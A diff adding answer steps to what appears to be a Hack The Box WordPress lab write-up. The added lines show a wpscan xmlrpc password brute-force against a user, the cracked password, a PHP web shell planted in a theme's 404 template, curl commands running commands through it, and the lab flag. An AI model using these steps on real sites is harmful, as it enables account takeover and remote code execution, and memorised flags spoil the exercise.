@@ -57,5 +57,9 @@ Use the LFI to identify a system user whose name starts with the letter "f".
 
 Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.
 
-* 
+* Run command " sudo wpscan --password-attack xmlrpc -t 20 -U erika -P rockyou.txt --url http:\//blog.inlanefreight.local ", we can do an xmlrpc attack as shown previously from our wpscans, the question is asking us to do an attack on an user called " erika " and we should use the " rockyou.txt " file as its a long and useful list of popular passwords
+* Once you get a positive result, you wull notice the password is " 010203 " and we will use it to access the webpages admin page. Once there, we should change the actual webpage theme for an obsolete one, such as the " Twenty Seventeen " as shown in previous examples.
+* Once changed, co to the " Theme editor " tab and save the " system($\_GET\['cmd']); " code into the 404 template as done in previous exercises
+* Once saved, you can run the command "curl http:\//blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/erika/ " and you will notice the flag has an unusual name which is " d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt "
+* Run command " curl http:\//blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt " , or just go to the url on your browser to check the flags content
 * HTB{w0rdPr355_4SS3ssm3n7}
